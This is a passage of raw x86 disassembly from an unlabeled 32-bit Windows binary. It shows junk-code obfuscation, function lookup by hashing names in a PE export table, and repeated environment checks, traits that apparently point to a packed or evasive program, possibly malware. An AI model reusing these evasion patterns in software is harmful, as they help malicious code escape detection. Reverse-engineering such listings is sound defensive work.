  423957:	add    DWORD PTR [eax],edx
  423959:	mov    eax,DWORD PTR [ebp-0x8]
  42395c:	mov    edx,DWORD PTR [ebp-0x10]
  42395f:	mov    eax,DWORD PTR [eax]
  423961:	xor    edx,ecx
  423963:	add    edx,0x3272f0
  423969:	not    edx
  42396b:	and    eax,edx
  42396d:	mov    DWORD PTR [ebp-0x4],eax
  423970:	movsx  eax,BYTE PTR [eax+0x1]
  423974:	cdq    
  423975:	add    eax,ebx
  423977:	adc    edx,0xffffffff
  42397a:	xor    eax,edi
  42397c:	xor    edx,0x0
  42397f:	cmp    eax,0x70941e0f
  423984:	jne    0x4239b8
  42398a:	cmp    edx,0xffffffff
  42398d:	jne    0x4239b8
  423993:	mov    eax,DWORD PTR [ebp-0x4]
  423996:	movsx  eax,BYTE PTR [eax]
  423999:	cdq    
  42399a:	add    eax,ebx
  42399c:	adc    edx,0xffffffff
  42399f:	xor    eax,edi
  4239a1:	xor    edx,0x0
  4239a4:	cmp    eax,0x70941e18
  4239a9:	jne    0x4239b8
  4239af:	cmp    edx,0xffffffff
  4239b2:	je     0x4239cf
  4239b8:	mov    eax,DWORD PTR [ebp-0x10]
  4239bb:	xor    eax,ecx
  4239bd:	mov    edx,0xffcd8d0f
  4239c2:	sub    edx,eax
  4239c4:	add    DWORD PTR [ebp-0x4],edx
  4239c7:	mov    eax,DWORD PTR [ebp-0x4]
  4239ca:	jmp    0x423970
  4239cf:	mov    eax,DWORD PTR [ebp-0x14]
  4239d2:	mov    eax,DWORD PTR [eax]
  4239d4:	mov    edx,DWORD PTR [ebp-0x4]
  4239d7:	mov    edx,DWORD PTR [edx+0x3c]
  4239da:	lea    eax,[edx+eax*8+0x78]
  4239de:	mov    edx,DWORD PTR [ebp-0x4]
  4239e1:	mov    eax,DWORD PTR [eax+edx*1]
  4239e4:	mov    DWORD PTR [ebp-0x8],eax
  4239e7:	mov    eax,DWORD PTR [ebp+0x8]
  4239ea:	xor    eax,ecx
  4239ec:	add    eax,esi
  4239ee:	mov    DWORD PTR [ebp-0x14],eax
  4239f1:	mov    eax,DWORD PTR [ebp+0x8]
  4239f4:	mov    edx,DWORD PTR [ebp-0x8]
  4239f7:	xor    eax,ecx
  4239f9:	add    eax,esi
  4239fb:	cmp    edx,eax
  4239fd:	jne    0x423a1b
  423a03:	mov    eax,DWORD PTR [ebp+0xc]
  423a06:	xor    eax,ecx
  423a08:	mov    ecx,DWORD PTR [ebp-0x8]
  423a0b:	add    eax,esi
  423a0d:	imul   eax,ecx
  423a10:	mov    DWORD PTR [ebp-0x8],eax
  423a13:	push   DWORD PTR [ebp+0x18]
  423a16:	jmp    0x423a76
  423a1b:	mov    eax,DWORD PTR [ebp-0x8]
  423a1e:	mov    ecx,DWORD PTR [ebp-0x4]
  423a21:	add    eax,ecx
  423a23:	mov    DWORD PTR [ebp-0x14],eax
  423a26:	mov    eax,DWORD PTR [ebp-0x14]
  423a29:	mov    eax,DWORD PTR [eax+0xc]
  423a2c:	movsx  eax,BYTE PTR [eax+ecx*1]
  423a30:	cdq    
  423a31:	add    eax,ebx
  423a33:	adc    edx,0xffffffff
  423a36:	xor    eax,edi
  423a38:	xor    edx,0x0
  423a3b:	cmp    eax,0x70941e1e
  423a40:	jne    0x423a13
  423a46:	cmp    edx,0xffffffff
  423a49:	jne    0x423a13
  423a4f:	mov    eax,ds:0x42941e
  423a54:	mov    eax,DWORD PTR [eax+0x198]
  423a5a:	mov    DWORD PTR [eax],ecx
  423a5c:	mov    eax,ecx
  423a5e:	jmp    0x423a87
  423a63:	mov    eax,DWORD PTR [ebp+0x18]
  423a66:	cmp    eax,0xf89c85ba
  423a6b:	jne    0x423a87
  423a71:	push   0xf89c85bb
  423a76:	push   DWORD PTR [ebp+0x14]
  423a79:	push   DWORD PTR [ebp+0x10]
  423a7c:	push   DWORD PTR [ebp+0xc]
  423a7f:	push   DWORD PTR [ebp+0x8]
  423a82:	call   0x42342f
  423a87:	pop    edi
  423a88:	pop    ebx
  423a89:	pop    esi
  423a8a:	leave  
  423a8b:	ret    0x14
  423a8e:	push   ebp
  423a8f:	mov    ebp,esp
  423a91:	and    esp,0xfffffff8
  423a94:	add    DWORD PTR ds:0x42a2ae,0x42a2ee
  423a9e:	sub    esp,0x3fc
  423aa4:	add    DWORD PTR ds:0x42a25e,0x42a25a
  423aae:	push   ebx
  423aaf:	mov    DWORD PTR ds:0x42a286,0x16c4
  423ab9:	push   esi
  423aba:	push   edi
  423abb:	xor    edi,edi
  423abd:	adc    DWORD PTR ds:0x42a26e,0x6687
  423ac7:	push   edi
  423ac8:	sbb    DWORD PTR ds:0x42a29a,0x42a2e2
  423ad2:	push   edi
  423ad3:	and    DWORD PTR ds:0x42a2ca,0x42a2ce
  423add:	push   edi
  423ade:	call   DWORD PTR ds:0x42a3d2
  423ae4:	or     DWORD PTR ds:0x42a25a,0x42a2e6
  423aee:	mov    DWORD PTR [esp+0x10],eax
  423af2:	and    DWORD PTR ds:0x42a262,0x1b9a
  423afc:	lea    eax,[esp+0x78]
  423b00:	push   eax
  423b01:	mov    DWORD PTR ds:0x42a2f6,0x43e8
  423b0b:	push   0x429542
  423b10:	call   DWORD PTR ds:0x42a406
  423b16:	mov    DWORD PTR ds:0x42a2ca,0x1192
  423b20:	cmp    eax,0xffffffff
  423b23:	mov    DWORD PTR ds:0x42a2ba,0x65ca
  423b2d:	je     0x423b3a
  423b33:	xor    eax,eax
  423b35:	jmp    0x424ddf
  423b3a:	and    DWORD PTR ds:0x42a2e2,0x0
  423b44:	mov    esi,DWORD PTR ds:0x42a2e2
  423b4a:	inc    esi
  423b4b:	mov    DWORD PTR ds:0x42a2e2,esi
  423b51:	cmp    DWORD PTR ds:0x42a2e2,0x23
  423b58:	jle    0x423b95
  423b5e:	jmp    0x423b88
  423b63:	push   0x42a2aa
  423b68:	push   0x7608
  423b6d:	push   0x7b9f
  423b72:	push   0x619c
  423b77:	push   DWORD PTR [ebp-0x18]
  423b7a:	push   DWORD PTR [ebp-0x18]
  423b7d:	push   0x2bb2
  423b82:	call   DWORD PTR ds:0x42a3ce
  423b88:	cmp    DWORD PTR ds:0x42a2e2,0x15
  423b8f:	jb     0x423b44
  423b95:	mov    esi,DWORD PTR ds:0x42a3fe
  423b9b:	push   0xf
  423b9d:	lea    eax,[esp+0x44]
  423ba1:	add    DWORD PTR ds:0x42a296,0x2da4
  423bab:	push   eax
  423bac:	adc    DWORD PTR ds:0x42a25a,0x42a2ce
  423bb6:	push   0x429556
  423bbb:	sub    DWORD PTR ds:0x42a2ca,0x42a2b6
  423bc5:	push   0x42956a
  423bca:	push   0x42958a
  423bcf:	sbb    DWORD PTR ds:0x42a2ae,0x7a6
  423bd9:	call   esi
  423bdb:	adc    DWORD PTR ds:0x42a2ae,0x6000
  423be5:	imul   eax,eax,0x300000
  423beb:	mov    DWORD PTR ds:0x42a256,0x5b4b
  423bf5:	cmp    eax,0x1b00000
  423bfa:	mov    DWORD PTR ds:0x42a266,0x1101
  423c04:	jne    0x423b33
  423c0a:	lea    eax,[esp+0x1b8]
  423c11:	sub    DWORD PTR ds:0x42a2c2,0x1046
  423c1b:	push   eax
  423c1c:	push   0x4295c6
  423c21:	call   DWORD PTR ds:0x42a402
  423c27:	mov    DWORD PTR ds:0x42a2a6,0x62e7
  423c31:	cmp    eax,0xffffffff
  423c34:	mov    DWORD PTR ds:0x42a292,0x7202
  423c3e:	jne    0x423b33
  423c44:	push   DWORD PTR [esp+0x10]
  423c48:	push   edi
  423c49:	and    DWORD PTR ds:0x42a27e,0x42a262
  423c53:	call   DWORD PTR ds:0x42a3e6
  423c59:	movzx  ecx,BYTE PTR ds:0x42a286
  423c60:	and    DWORD PTR ds:0x42a2a2,ecx
  423c66:	mov    DWORD PTR [esp+0x30],edi
  423c6a:	sub    ecx,0x7aec
  423c70:	mov    DWORD PTR [esp+0x20],0xf89c85a5
  423c78:	and    DWORD PTR ds:0x42a2be,0x0
  423c82:	jmp    0x423c96
  423c87:	xor    ebx,ebx
  423c89:	xor    ebx,DWORD PTR ds:0x42a2be
  423c8f:	inc    ebx
  423c90:	mov    DWORD PTR ds:0x42a2be,ebx
  423c96:	cmp    DWORD PTR ds:0x42a2be,0x1c
  423c9d:	jae    0x423ce1
  423ca3:	cmp    DWORD PTR ds:0x42a2be,0x8
  423caa:	jg     0x423ce1
  423cb0:	jmp    0x423cc0
  423cb5:	push   0x433e
  423cba:	call   DWORD PTR ds:0x42a3d6
  423cc0:	cmp    DWORD PTR ds:0x42a2be,0x7
  423cc7:	jne    0x423cdc
  423ccd:	xor    ebx,ebx
  423ccf:	xor    ebx,DWORD PTR ds:0x42a2be
  423cd5:	inc    ebx
  423cd6:	mov    DWORD PTR ds:0x42a2be,ebx
  423cdc:	jmp    0x423c87
  423ce1:	mov    DWORD PTR [esp+0xc],0xf89c85ba
  423ce9:	lea    eax,[esp+0x3c]
  423ced:	add    DWORD PTR ds:0x42a25a,ebx
  423cf3:	mov    DWORD PTR [esp+0x30],eax
  423cf7:	lea    eax,[esp+0x38]
  423cfb:	mov    DWORD PTR [esp+0x10],eax
  423cff:	and    ecx,DWORD PTR ds:0x42a2aa
  423d05:	mov    eax,ds:0x42941e
  423d0a:	mov    DWORD PTR ds:0x42a2e6,0x11
  423d14:	cmp    DWORD PTR ds:0x42a2e6,0x0
  423d1b:	je     0x423d70
  423d21:	cmp    DWORD PTR ds:0x42a2e6,0x7
  423d28:	jle    0x423d70
  423d2e:	jmp    0x423d44
  423d33:	push   DWORD PTR [ebp-0x28]
  423d36:	push   DWORD PTR [ebp-0x20]
  423d39:	push   0x43b4
  423d3e:	call   DWORD PTR ds:0x42a3da
  423d44:	cmp    DWORD PTR ds:0x42a2e6,0x8
  423d4b:	jne    0x423d5e
  423d51:	mov    ebx,DWORD PTR ds:0x42a2e6
  423d57:	dec    ebx
  423d58:	mov    DWORD PTR ds:0x42a2e6,ebx
  423d5e:	mov    ebx,DWORD PTR ds:0x42a2e6
  423d64:	dec    ebx
  423d65:	mov    DWORD PTR ds:0x42a2e6,ebx
  423d6b:	jmp    0x423d14
  423d70:	mov    eax,DWORD PTR [eax+0x1c8]
  423d76:	movzx  ecx,BYTE PTR ds:0x42a29e
  423d7d:	sub    DWORD PTR ds:0x42a286,ecx
  423d83:	mov    eax,DWORD PTR [eax]
  423d85:	mov    ecx,DWORD PTR [esp+0x10]
  423d89:	movzx  edi,WORD PTR ds:0x42a2b6
  423d90:	adc    DWORD PTR ds:0x42a2a6,edi
  423d96:	mov    edi,0x75108aa
  423d9b:	xor    eax,edi
  423d9d:	or     DWORD PTR ds:0x42a2b2,0x565
  423da7:	mov    ebx,0x3272f1
  423dac:	mov    DWORD PTR ds:0x42a272,0x78c3
  423db6:	add    eax,ebx
  423db8:	mov    DWORD PTR ds:0x42a2d2,0x2205
  423dc2:	mov    DWORD PTR [ecx],eax
  423dc4:	mov    eax,0x7be2
  423dc9:	mov    eax,ds:0x42a11a
  423dce:	cmp    eax,0x445cecf9
  423dd3:	jne    0x423ed2
  423dd9:	mov    DWORD PTR ds:0x42a2da,0x1f
  423de3:	cmp    DWORD PTR ds:0x42a2da,0x0
  423dea:	je     0x423e45
  423df0:	cmp    DWORD PTR ds:0x42a2da,0x8
  423df7:	ja     0x423e45
  423dfd:	jmp    0x423e1d
  423e02:	push   DWORD PTR [ebp-0xc]
  423e05:	push   0x6d68
  423e0a:	push   0x65f4
  423e0f:	push   DWORD PTR [ebp-0x1c]
  423e12:	push   0x42a292
  423e17:	call   DWORD PTR ds:0x42a3de
  423e1d:	cmp    DWORD PTR ds:0x42a2da,0x9
  423e24:	jne    0x423e35
  423e2a:	mov    eax,ds:0x42a2da
  423e2f:	dec    eax
  423e30:	mov    ds:0x42a2da,eax
  423e35:	mov    eax,ds:0x42a2da
  423e3a:	dec    eax
  423e3b:	mov    ds:0x42a2da,eax
  423e40:	jmp    0x423de3
  423e45:	mov    eax,DWORD PTR [esp+0x20]
  423e49:	mov    ecx,DWORD PTR ds:0x42941e
  423e4f:	adc    DWORD PTR ds:0x42a272,0x42a276
  423e59:	mov    ecx,DWORD PTR [ecx+0x198]
  423e5f:	sub    DWORD PTR ds:0x42a266,0x3ba6
  423e69:	xor    eax,edi
  423e6b:	add    eax,ebx
  423e6d:	sbb    DWORD PTR ds:0x42a286,0x42a266
  423e77:	mov    DWORD PTR [ecx],eax
  423e79:	xor    eax,0x20bc
  423e7e:	mov    eax,DWORD PTR [esp+0x20]
  423e82:	adc    DWORD PTR ds:0x42a2d2,0x4876
  423e8c:	xor    eax,edi
  423e8e:	add    DWORD PTR ds:0x42a2e2,0x2a33
  423e98:	add    eax,ebx
  423e9a:	mov    ds:0x42a11a,eax
  423e9f:	movzx  eax,WORD PTR ds:0x42a29a
  423ea6:	sub    eax,DWORD PTR ds:0x42a2da
  423eac:	mov    ds:0x42a29a,eax
  423eb1:	mov    eax,DWORD PTR [esp+0x20]
  423eb5:	and    DWORD PTR ds:0x42a292,0x51c2
  423ebf:	xor    eax,edi
  423ec1:	add    eax,ebx
  423ec3:	or     DWORD PTR ds:0x42a2fa,0x2cb7
  423ecd:	mov    ds:0x429516,eax
  423ed2:	sbb    eax,0x6039
  423ed7:	mov    eax,ds:0x42941e
  423edc:	mov    eax,DWORD PTR [eax+0x18c]
  423ee2:	xor    DWORD PTR ds:0x42a2ca,0x42a2ce
  423eec:	mov    eax,DWORD PTR [eax]
  423eee:	add    DWORD PTR ds:0x42a2f6,0x42a29e
  423ef8:	mov    DWORD PTR [esp+0x60],eax
  423efc:	and    DWORD PTR ds:0x42a26e,0x0
  423f06:	mov    eax,ds:0x42a26e
  423f0b:	inc    eax
  423f0c:	mov    ds:0x42a26e,eax
  423f11:	cmp    DWORD PTR ds:0x42a26e,0x8
  423f18:	jb     0x423f56
  423f1e:	jmp    0x423f31
  423f23:	push   DWORD PTR [ebp-0x18]
  423f26:	push   0x42a2a6
  423f2b:	call   DWORD PTR ds:0x42a40a
  423f31:	cmp    DWORD PTR ds:0x42a26e,0x7
  423f38:	jne    0x423f49
  423f3e:	mov    eax,ds:0x42a26e
  423f43:	inc    eax
  423f44:	mov    ds:0x42a26e,eax
  423f49:	cmp    DWORD PTR ds:0x42a26e,0x16
  423f50:	jb     0x423f06
  423f56:	mov    eax,0xf89c85b9
  423f5b:	and    DWORD PTR ds:0x42a25a,0x42a2ca
  423f65:	mov    DWORD PTR [esp+0x18],eax
  423f69:	mov    DWORD PTR [esp+0x18],eax
  423f6d:	mov    DWORD PTR [esp+0x18],eax
  423f71:	sub    DWORD PTR ds:0x42a26e,0x2657
  423f7b:	mov    DWORD PTR [esp+0x18],0xf89c85a5
  423f83:	mov    DWORD PTR [esp+0x10],eax
  423f87:	mov    DWORD PTR [esp+0x10],0xf89c85bd
  423f8f:	dec    DWORD PTR ds:0x42a2ba
  423f95:	mov    eax,DWORD PTR [esp+0x20]
  423f99:	xor    DWORD PTR ds:0x42a28a,0x42a2de
  423fa3:	xor    eax,edi
  423fa5:	sbb    DWORD PTR ds:0x42a286,0xceb
  423faf:	add    eax,ebx
  423fb1:	mov    DWORD PTR ds:0x42a2fe,0x5bbe
  423fbb:	jmp    0x4240ff
  423fc0:	lea    eax,[esp+0x78]
  423fc4:	push   eax
  423fc5:	add    DWORD PTR ds:0x42a26a,0x42a266
  423fcf:	push   0x4295b2
  423fd4:	call   DWORD PTR ds:0x42a406
  423fda:	cmp    eax,0xffffffff
  423fdd:	mov    DWORD PTR ds:0x42a29a,0x7074
  423fe7:	jne    0x423b33
  423fed:	push   0xf
  423fef:	sub    DWORD PTR ds:0x42a2a6,0x5dcc
  423ff9:	lea    eax,[esp+0x44]
  423ffd:	push   eax
  423ffe:	sbb    DWORD PTR ds:0x42a2d2,0x2005
  424008:	push   0x429606
  42400d:	sub    DWORD PTR ds:0x42a2be,0x2b2b
  424017:	push   0x42961a
  42401c:	add    DWORD PTR ds:0x42a2f2,0x4bf9
  424026:	push   0x42963a
  42402b:	call   esi
  42402d:	imul   eax,eax,0x300000
  424033:	cmp    eax,0x1b00000
  424038:	mov    DWORD PTR ds:0x42a2be,0x7b39
  424042:	jne    0x423b33
  424048:	adc    DWORD PTR ds:0x42a29e,0x2f79
  424052:	lea    eax,[esp+0x1b8]
  424059:	xor    DWORD PTR ds:0x42a26a,0x2364
  424063:	push   eax
  424064:	push   0x429676
  424069:	call   DWORD PTR ds:0x42a402
  42406f:	mov    DWORD PTR ds:0x42a27e,0x2c82
  424079:	cmp    eax,0xffffffff
  42407c:	mov    DWORD PTR ds:0x42a2fa,0x479f
  424086:	jne    0x423b33
  42408c:	mov    eax,DWORD PTR [esp+0xc]
  424090:	mov    ecx,DWORD PTR [esp+0x10]
  424094:	xor    eax,edi
  424096:	add    DWORD PTR ds:0x42a29a,0x71aa
  4240a0:	lea    eax,[eax+ecx*1+0x3272f1]
  4240a7:	adc    DWORD PTR ds:0x42a2c6,0x42a292
  4240b1:	push   eax
  4240b2:	mov    eax,DWORD PTR [esp+0x1c]
  4240b6:	or     DWORD PTR ds:0x42a2fa,0x259a
  4240c0:	xor    eax,edi
  4240c2:	lea    eax,[ebp+eax*1+0x3272f9]
  4240c9:	push   eax
  4240ca:	xor    DWORD PTR ds:0x42a2aa,0x66c
  4240d4:	mov    eax,ds:0x42941e
  4240d9:	push   DWORD PTR [eax+0x1bc]
  4240df:	and    DWORD PTR ds:0x42a2ce,0x42a27e
  4240e9:	call   0x424de8
  4240ee:	mov    eax,DWORD PTR [esp+0xc]
  4240f2:	mov    ecx,DWORD PTR [esp+0x10]
  4240f6:	xor    eax,edi
  4240f8:	lea    eax,[ecx+eax*1+0x3272f1]
  4240ff:	mov    ecx,DWORD PTR [esp+0xc]
  424103:	mov    DWORD PTR ds:0x42a2ea,0x12
  42410d:	cmp    DWORD PTR ds:0x42a2ea,0x0
  424114:	je     0x424164
  42411a:	cmp    DWORD PTR ds:0x42a2ea,0x2
  424121:	jbe    0x424164
  424127:	jmp    0x424138
  42412c:	push   DWORD PTR [ebp-0x24]
  42412f:	push   DWORD PTR [ebp-0x14]
  424132:	call   DWORD PTR ds:0x42a3e2
  424138:	cmp    DWORD PTR ds:0x42a2ea,0x3
  42413f:	jne    0x424152
  424145:	mov    edx,DWORD PTR ds:0x42a2ea
  42414b:	dec    edx
  42414c:	mov    DWORD PTR ds:0x42a2ea,edx
  424152:	mov    edx,DWORD PTR ds:0x42a2ea
  424158:	dec    edx
  424159:	mov    DWORD PTR ds:0x42a2ea,edx
  42415f:	jmp    0x42410d
  424164:	mov    edx,DWORD PTR [esp+0xc]
  424168:	and    DWORD PTR ds:0x42a2e6,0x42a2a2
  424172:	xor    edx,edi
  424174:	xor    ecx,edi
  424176:	adc    DWORD PTR ds:0x42a28a,0x42a2b6
  424180:	add    ecx,edx
  424182:	mov    edx,DWORD PTR ds:0x42a2ce
  424188:	sbb    edx,DWORD PTR ds:0x42a2e2
  42418e:	mov    DWORD PTR ds:0x42a2ce,edx
  424194:	mov    edx,DWORD PTR [esp+0xc]
  424198:	xor    edx,edi
  42419a:	mov    DWORD PTR ds:0x42a27e,0x2a3d
  4241a4:	lea    ecx,[ecx+edx*1+0x9758d3]
  4241ab:	mov    DWORD PTR [esp+0x10],eax
  4241af:	mov    DWORD PTR ds:0x42a2fa,0x2809
  4241b9:	cmp    eax,ecx
  4241bb:	mov    DWORD PTR ds:0x42a28a,0x80a
  4241c5:	jbe    0x423fc0
  4241cb:	adc    DWORD PTR ds:0x42a28a,ebx
  4241d1:	mov    eax,DWORD PTR [ebp+0xc]
  4241d4:	add    DWORD PTR ds:0x42a2be,ebx
  4241da:	mov    ds:0x4292a2,eax
  4241df:	mov    DWORD PTR ds:0x42a2be,0x1e
  4241e9:	cmp    DWORD PTR ds:0x42a2be,0x0
  4241f0:	je     0x424241
  4241f6:	cmp    DWORD PTR ds:0x42a2be,0xc
  4241fd:	jbe    0x424241
  424203:	jmp    0x424219
  424208:	push   DWORD PTR [ebp-0xc]
  42420b:	push   DWORD PTR [ebp-0x10]
  42420e:	push   0x658e
  424213:	call   DWORD PTR ds:0x42a40e
  424219:	cmp    DWORD PTR ds:0x42a2be,0xd
  424220:	jne    0x424231
  424226:	mov    eax,ds:0x42a2be
  42422b:	dec    eax
  42422c:	mov    ds:0x42a2be,eax
  424231:	mov    eax,ds:0x42a2be
  424236:	dec    eax
  424237:	mov    ds:0x42a2be,eax
  42423c:	jmp    0x4241e9
  424241:	mov    eax,DWORD PTR [ebp+0x10]
  424244:	mov    DWORD PTR ds:0x42a2aa,0x11
  42424e:	cmp    DWORD PTR ds:0x42a2aa,0x0
  424255:	je     0x424290
  42425b:	cmp    DWORD PTR ds:0x42a2aa,0x12
  424262:	ja     0x424290
  424268:	jmp    0x42427e
  42426d:	push   DWORD PTR [ebp-0x1c]
  424270:	push   DWORD PTR [ebp-0x10]
  424273:	push   0x1d56
  424278:	call   DWORD PTR ds:0x42a412
  42427e:	mov    ecx,DWORD PTR ds:0x42a2aa
  424284:	dec    ecx
  424285:	mov    DWORD PTR ds:0x42a2aa,ecx
  42428b:	jmp    0x42424e
  424290:	mov    ds:0x4294fe,eax
  424295:	or     DWORD PTR ds:0x42a2d2,ecx
  42429b:	mov    eax,ds:0x4292a2
  4242a0:	mov    ecx,DWORD PTR [esp+0x30]
  4242a4:	sub    eax,ebx
  4242a6:	xor    eax,edi
  4242a8:	mov    DWORD PTR [ecx],eax
  4242aa:	adc    DWORD PTR ds:0x42a2fe,0x42a2de
  4242b4:	lea    eax,[esp+0x2c]
  4242b8:	sbb    DWORD PTR ds:0x42a2aa,0x42a2be
  4242c2:	mov    DWORD PTR [esp+0x6c],eax
  4242c6:	lea    eax,[ebp+0x4]
  4242c9:	mov    DWORD PTR [esp+0x2c],eax
  4242cd:	lea    eax,[esp+0x78]
  4242d1:	push   eax
  4242d2:	sub    DWORD PTR ds:0x42a2ea,0x42a286
  4242dc:	push   0x429662
  4242e1:	call   DWORD PTR ds:0x42a406
  4242e7:	cmp    eax,0xffffffff
  4242ea:	mov    DWORD PTR ds:0x42a2f2,0x2a21
  4242f4:	jne    0x423b33
  4242fa:	push   0xf
  4242fc:	sub    DWORD PTR ds:0x42a29e,0x42a2a6
  424306:	lea    eax,[esp+0x44]
  42430a:	xor    DWORD PTR ds:0x42a27a,0x6f67
  424314:	push   eax
  424315:	push   0x4296b6
  42431a:	add    DWORD PTR ds:0x42a29e,0xde7
  424324:	push   0x4296ca
  424329:	adc    DWORD PTR ds:0x42a2da,0x42a266
  424333:	push   0x4296ea
  424338:	call   esi
  42433a:	mov    DWORD PTR ds:0x42a29e,0x79ec
  424344:	imul   eax,eax,0x300000
  42434a:	mov    DWORD PTR ds:0x42a286,0x463d
  424354:	cmp    eax,0x1b00000
  424359:	jne    0x423b33
  42435f:	lea    eax,[esp+0x1b8]
  424366:	and    DWORD PTR ds:0x42a2be,0x42a2ae
  424370:	push   eax
  424371:	adc    DWORD PTR ds:0x42a2fa,0x42a2aa
  42437b:	push   0x429726
  424380:	xor    DWORD PTR ds:0x42a2ca,0x42a25a
  42438a:	call   DWORD PTR ds:0x42a402
  424390:	mov    DWORD PTR ds:0x42a272,0x4e57
  42439a:	cmp    eax,0xffffffff
  42439d:	mov    DWORD PTR ds:0x42a302,0x1bd9
  4243a7:	jne    0x423b33
  4243ad:	or     DWORD PTR ds:0x42a2fe,0x42a2e2
  4243b7:	lea    eax,[esp+0x78]
  4243bb:	sub    DWORD PTR ds:0x42a25e,0x6538
  4243c5:	push   eax
  4243c6:	add    DWORD PTR ds:0x42a2ae,0x42a2fe
  4243d0:	push   0x429712
  4243d5:	call   DWORD PTR ds:0x42a406
  4243db:	mov    DWORD PTR ds:0x42a2ee,0x1cd6
  4243e5:	cmp    eax,0xffffffff
  4243e8:	mov    DWORD PTR ds:0x42a2c2,0x32c8
  4243f2:	jne    0x423b33
  4243f8:	push   0xf
  4243fa:	lea    eax,[esp+0x44]
  4243fe:	xor    DWORD PTR ds:0x42a29e,0x42a2a6
  424408:	push   eax
  424409:	push   0x429766
  42440e:	adc    DWORD PTR ds:0x42a29e,0x7895
  424418:	push   0x42977a
  42441d:	push   0x42979a
  424422:	call   esi
  424424:	imul   eax,eax,0x300000
  42442a:	cmp    eax,0x1b00000
  42442f:	jne    0x423b33
  424435:	lea    eax,[esp+0x1b8]
  42443c:	push   eax
  42443d:	push   0x4297d6
  424442:	sub    DWORD PTR ds:0x42a2ca,0x42a296
  42444c:	call   DWORD PTR ds:0x42a402
  424452:	mov    DWORD PTR ds:0x42a292,0x3d95
  42445c:	cmp    eax,0xffffffff
  42445f:	mov    DWORD PTR ds:0x42a28a,0x79ad
  424469:	jne    0x423b33
  42446f:	lea    eax,[esp+0x78]
  424473:	add    DWORD PTR ds:0x42a25a,0x6022
  42447d:	push   eax
  42447e:	neg    DWORD PTR ds:0x42a28a
  424484:	push   0x4297c2
  424489:	add    DWORD PTR ds:0x42a286,0x42a2f2
  424493:	call   DWORD PTR ds:0x42a406
  424499:	mov    DWORD PTR ds:0x42a27a,0x4f36
  4244a3:	cmp    eax,0xffffffff
  4244a6:	mov    DWORD PTR ds:0x42a2a2,0x71f8
  4244b0:	jne    0x423b33
  4244b6:	xor    DWORD PTR ds:0x42a2c2,0x540c
  4244c0:	push   0xf
  4244c2:	or     DWORD PTR ds:0x42a256,0x42a276
  4244cc:	lea    eax,[esp+0x44]
  4244d0:	and    DWORD PTR ds:0x42a2b6,0x3361
  4244da:	push   eax
  4244db:	sub    DWORD PTR ds:0x42a2c6,0x5c7b
  4244e5:	push   0x429816
  4244ea:	adc    DWORD PTR ds:0x42a2b6,0x42a2da
  4244f4:	push   0x42982a
  4244f9:	xor    DWORD PTR ds:0x42a28e,0x42a2c2
  424503:	push   0x42984a
  424508:	or     DWORD PTR ds:0x42a2ba,0x42a2da
  424512:	call   esi
  424514:	imul   eax,eax,0x300000
  42451a:	mov    DWORD PTR ds:0x42a262,0x112c
  424524:	cmp    eax,0x1b00000
  424529:	jne    0x423b33
  42452f:	or     DWORD PTR ds:0x42a25a,0x1a1c
  424539:	lea    eax,[esp+0x1b8]
  424540:	push   eax
  424541:	sub    DWORD PTR ds:0x42a2f6,0xb4e
  42454b:	push   0x429886
  424550:	not    DWORD PTR ds:0x42a25e
  424556:	call   DWORD PTR ds:0x42a402
  42455c:	mov    DWORD PTR ds:0x42a2e2,0x34b9
  424566:	cmp    eax,0xffffffff
  424569:	mov    DWORD PTR ds:0x42a2c6,0x68d6
  424573:	jne    0x423b33
  424579:	lea    eax,[esp+0x78]
  42457d:	push   eax
  42457e:	sub    DWORD PTR ds:0x42a2b2,0x42a28e
  424588:	push   0x429872
  42458d:	sub    DWORD PTR ds:0x42a2aa,0xfe
  424597:	call   DWORD PTR ds:0x42a406
  42459d:	mov    DWORD PTR ds:0x42a2ae,0x162e
  4245a7:	cmp    eax,0xffffffff
  4245aa:	jne    0x423b33
  4245b0:	add    DWORD PTR ds:0x42a29a,0x39d
  4245ba:	push   0xf
  4245bc:	lea    eax,[esp+0x44]
  4245c0:	push   eax
  4245c1:	sbb    DWORD PTR ds:0x42a2ea,0x4c8c
  4245cb:	push   0x4298c6
  4245d0:	push   0x4298da
  4245d5:	push   0x4298fa
  4245da:	call   esi
  4245dc:	sub    DWORD PTR ds:0x42a25a,0x42a26e
  4245e6:	imul   eax,eax,0x300000
  4245ec:	mov    DWORD PTR ds:0x42a296,0x5962
  4245f6:	cmp    eax,0x1b00000
  4245fb:	jne    0x423b33
  424601:	add    DWORD PTR ds:0x42a2ae,0x42a2d6
  42460b:	lea    eax,[esp+0x1b8]
  424612:	or     DWORD PTR ds:0x42a2b6,0x4619
  42461c:	push   eax
  42461d:	push   0x429936
  424622:	and    DWORD PTR ds:0x42a27a,0x42a2fa
  42462c:	call   DWORD PTR ds:0x42a402
  424632:	mov    DWORD PTR ds:0x42a2fa,0x2004
  42463c:	cmp    eax,0xffffffff
  42463f:	mov    DWORD PTR ds:0x42a296,0x62c6
  424649:	jne    0x423b33
  42464f:	and    DWORD PTR ds:0x42a2de,0x5eb4
  424659:	lea    eax,[esp+0x78]
  42465d:	adc    DWORD PTR ds:0x42a28a,0x4918
  424667:	push   eax
  424668:	or     DWORD PTR ds:0x42a2a6,0x42a25e
  424672:	push   0x429922
  424677:	sbb    DWORD PTR ds:0x42a2a2,0x42a262
  424681:	call   DWORD PTR ds:0x42a406
  424687:	mov    DWORD PTR ds:0x42a25a,0x13e7
  424691:	cmp    eax,0xffffffff
  424694:	mov    DWORD PTR ds:0x42a2da,0xa62
  42469e:	jne    0x423b33
  4246a4:	xor    DWORD PTR ds:0x42a266,0x42a2c6
  4246ae:	push   0xf
  4246b0:	lea    eax,[esp+0x44]
  4246b4:	or     DWORD PTR ds:0x42a2be,0x2cef
  4246be:	push   eax
  4246bf:	push   0x429976
  4246c4:	push   0x42998a
  4246c9:	sub    DWORD PTR ds:0x42a2ae,0x42a29a
  4246d3:	push   0x4299aa
  4246d8:	call   esi
  4246da:	imul   eax,eax,0x300000
  4246e0:	mov    DWORD PTR ds:0x42a29e,0x43ec
  4246ea:	cmp    eax,0x1b00000
  4246ef:	mov    DWORD PTR ds:0x42a2d2,0x18cb
  4246f9:	jne    0x423b33
  4246ff:	add    DWORD PTR ds:0x42a2ba,0x5057
  424709:	lea    eax,[esp+0x1b8]
  424710:	or     DWORD PTR ds:0x42a2ce,0x48df
  42471a:	push   eax
  42471b:	and    DWORD PTR ds:0x42a2ee,0x7c0c
  424725:	push   0x4299e6
  42472a:	and    DWORD PTR ds:0x42a302,0x42a2e2
  424734:	call   DWORD PTR ds:0x42a402
  42473a:	cmp    eax,0xffffffff
